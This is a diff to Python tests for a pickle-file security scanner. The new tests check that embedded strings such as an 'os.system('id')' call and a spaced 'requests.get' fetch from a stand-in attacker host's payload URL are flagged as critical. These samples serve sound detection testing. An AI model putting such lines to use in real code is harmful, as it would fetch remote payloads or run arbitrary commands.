@@ -1444,6 +1444,7 @@ def test_scan_stream_allows_inert_pickle_url_literals_without_critical_s310() ->
         {
             "license": "https://ultralytics.com/license",
             "docs": "https://docs.ultralytics.com/reference/os.system(command)",
+            "api_docs": "https://docs.example.invalid/reference/requests.get(url)",
             "repository": "https://github.com/ultralytics/ultralytics",
         },
         protocol=0,
@@ -1453,6 +1454,18 @@ def test_scan_stream_allows_inert_pickle_url_literals_without_critical_s310() ->
 
     assert result.success is True
     assert not any(issue.rule_code == "S310" and issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_stream_keeps_code_after_url_literal_actionable() -> None:
+    payload = pickle.dumps({"loader": "u='https://example.invalid/p';os.system('id')"}, protocol=0)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="url-then-code.pkl")
+
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and (issue.details.get("associated_global") == "os.system" or "os.system" in issue.message)
+        for issue in result.issues
+    )
 
 
 def test_scan_stream_keeps_executable_network_literal_actionable() -> None:
@@ -1467,11 +1480,20 @@ def test_scan_stream_keeps_executable_network_literal_actionable() -> None:
     result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="network-code.pkl")
 
     assert any(
-        issue.severity == IssueSeverity.CRITICAL
-        and issue.details.get("type") == "network_function"
-        and issue.details.get("function") == "requests.get"
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
         for issue in result.issues
     )
+
+
+def test_scan_stream_keeps_spaced_network_attribute_url_actionable() -> None:
+    payload = pickle.dumps({"loader": "requests . get('https://attacker.example/payload')"}, protocol=0)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="spaced-network-code.pkl")
+
     assert any(
         issue.rule_code == "S310"
         and issue.severity == IssueSeverity.CRITICAL
